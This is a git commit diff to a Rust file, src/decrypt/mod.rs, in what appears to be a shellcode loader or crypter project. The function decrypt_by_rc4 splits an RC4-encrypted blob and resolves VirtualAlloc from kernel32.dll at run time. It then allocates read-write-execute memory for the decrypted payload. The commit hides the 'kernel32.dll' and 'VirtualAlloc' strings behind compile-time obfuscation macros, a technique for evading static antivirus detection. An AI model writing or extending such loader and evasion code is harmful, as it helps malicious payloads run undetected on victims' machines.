46c97870bf107b04f4cb25fd6890512ab8d982e7
Iwindy <12398041+iwindy0@user.noreply.gitee.com>
2025-11-19 11:29:36 +0800

    update

--- src/decrypt/mod.rs
+++ src/decrypt/mod.rs
@@ -2,7 +2,7 @@
 #[cfg(feature = "decrypt_rc4")]
 #[allow(dead_code)]
 pub unsafe fn decrypt_by_rc4(decoded: &[u8]) -> Result<usize, String> {
-    use rustcrypt_ct_macros::obf_lit;
+    use rustcrypt_ct_macros::{obf_lit, obf_lit_bytes};
     use windows_sys::Win32::System::Memory::{MEM_COMMIT, PAGE_EXECUTE_READWRITE};
     use windows_sys::Win32::System::LibraryLoader::{LoadLibraryA, GetProcAddress};
     use core::mem::transmute;
@@ -19,9 +19,9 @@ pub unsafe fn decrypt_by_rc4(decoded: &[u8]) -> Result<usize, String> {
     let hash = &decoded[key_len..key_len + hash_len];
     let encrypted = &decoded[key_len + hash_len..];
     type VirtualAllocFn = unsafe extern "system" fn(*mut c_void, usize, u32, u32) -> *mut c_void;
-    let k32 = LoadLibraryA(b"kernel32.dll\0".as_ptr());
+    let k32 = LoadLibraryA(obf_lit_bytes!(b"kernel32.dll\0").as_ptr());
     if k32 == 0 { return Err(obf_lit!("Failed to load kernel32.dll").to_string()); }
-    let p_va = GetProcAddress(k32, b"VirtualAlloc\0".as_ptr());
+    let p_va = GetProcAddress(k32, obf_lit_bytes!(b"VirtualAlloc\0").as_ptr());
     if p_va.is_none() { return Err(obf_lit!("Failed to resolve VirtualAlloc").to_string()); }
     let virtual_alloc: VirtualAllocFn = transmute(p_va.unwrap());
     let p = virtual_alloc(core::ptr::null_mut(), encrypted.len(), MEM_COMMIT, PAGE_EXECUTE_READWRITE) as *mut u8;
